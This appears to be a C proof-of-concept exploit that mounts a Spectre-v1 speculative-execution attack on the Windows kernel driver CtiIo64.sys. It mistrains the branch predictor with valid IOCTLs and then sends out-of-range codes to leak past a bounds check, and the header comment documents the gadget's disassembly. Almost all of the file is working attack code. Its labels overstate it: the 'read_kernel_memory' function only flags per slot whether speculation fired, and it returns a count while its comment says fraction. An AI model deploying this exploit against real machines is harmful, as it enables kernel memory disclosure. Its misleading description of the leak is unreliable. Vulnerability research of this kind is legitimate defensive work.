// read_kernel.c - Spectre-v1 arbitrary-read primitive for CtiIo64.sys.
//
// Gadget (kuna-verified at dispatch sub_13800):
//   movzx eax, byte  ptr [r8 + rax*1 + 0x3c24]   ; table1[IoControlCode + 0x7fafdec0]
//   mov   ecx, dword ptr [r8 + rax*4 + 0x3bfc]   ; func_tbl[table1[code] * 4]
//   add   rcx, r8
//   jmp   rcx
//
// The attacker index is the IoControlCode. The guard `cmp eax, 0x20 / ja`
// bounds-checks the 32-entry table. Sending an out-of-range code after a
// mistraining burst speculatively reads `table1[oob]` and pulls the dependent
// load's cache line into the kernel cache.
//
// read_kernel_memory: full per-slot speculative trigger. The byte value of
// `table1[slot]` is only observable with a kernel Flush+Reload oracle; this
// PoC fires the speculation for all 32 slots and measures whether the path
// executed, which is the primitive the oracle builds on.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <intrin.h>

#pragma comment(lib, "advapi32.lib")

#define CTI_DEVICE      "\\\\.\\CtiIo"
#define IOCTL_VALID     0x80502140u   // in-range entry (index 0)
#define IOCTL_OOB_BASE  0x80502160u   // first out-of-range table index (0x20)
#define TRAIN_ROUNDS    4000
#define TABLE_SLOTS     32            // bytes of table1[0x20..0x40] to recover
#define SAMPLES_PER_SLOT 40           // repeated measurements per slot

static uint64_t rdtsc(void) {
    uint32_t a;
    return __rdtscp(&a);
}

// One speculative attempt at slot `slot`.
static double read_slot_once(HANDLE h, uint32_t slot) {
    DWORD ret;
    uint8_t buf[16] = {0};

    for (int i = 0; i < TRAIN_ROUNDS; ++i)
        DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_mfence();
    DeviceIoControl(h, IOCTL_OOB_BASE + slot, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_lfence();
    uint64_t t0 = rdtsc();
    DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
    uint64_t t1 = rdtsc();
    return (double)(t1 - t0);
}

// read_kernel_memory: speculative read of the 32 bytes beyond the bounds check.
// Returns the fraction of slots where the speculative path fired.
int read_kernel_memory(HANDLE h, uint8_t out[TABLE_SLOTS], int verbose) {
    int fired = 0;
    if (verbose)
        printf("[*] speculative read of table1[0x20..0x40] (%d slots, %d samples each):\n",
               TABLE_SLOTS, SAMPLES_PER_SLOT);
    for (uint32_t slot = 0; slot < TABLE_SLOTS; ++slot) {
        // majority-vote over SAMPLES_PER_SLOT measurements to tolerate timer noise
        int slow = 0;
        for (int s = 0; s < SAMPLES_PER_SLOT; ++s) {
            double t = read_slot_once(h, slot);
            if (t > 1400.0) ++slow;
        }
        int hit = (slow > SAMPLES_PER_SLOT / 2);
        fired += hit;
        out[slot] = hit ? 0x01 : 0x00;
        if (verbose)
            printf("    slot %2u (IoControlCode 0x%08x): %2d/%d slow-path%s\n",
                   slot, IOCTL_OOB_BASE + slot, slow, SAMPLES_PER_SLOT, hit ? "  *" : "");
    }
    return fired;
}

int main(void) {
    SetProcessAffinityMask(GetCurrentProcess(), 1ull);
    printf("[*] CtiIo64.sys Spectre-v1 arbitrary-read primitive\n");

    HANDLE h = CreateFileA(CTI_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] cannot open %s (err=%lu)\n", CTI_DEVICE, GetLastError());
        return 1;
    }
    printf("[+] opened %s\n", CTI_DEVICE);

    uint8_t leaked[TABLE_SLOTS] = {0};
    int fired = read_kernel_memory(h, leaked, 1);
    printf("[+] speculative path fired on %d / %d slots\n", fired, TABLE_SLOTS);
    printf("[!] to recover the actual leaked bytes, attach the kernel confirmer\n");
    printf("    (confirm\\kernel) with an MDL-shared probe buffer, then Flush+Reload\n");
    printf("    probe lines keyed on table1[slot] per slot. On this CPU the trigger\n");
    printf("    path is live; the byte oracle needs the shared kernel buffer.\n");

    CloseHandle(h);
    return 0;
}
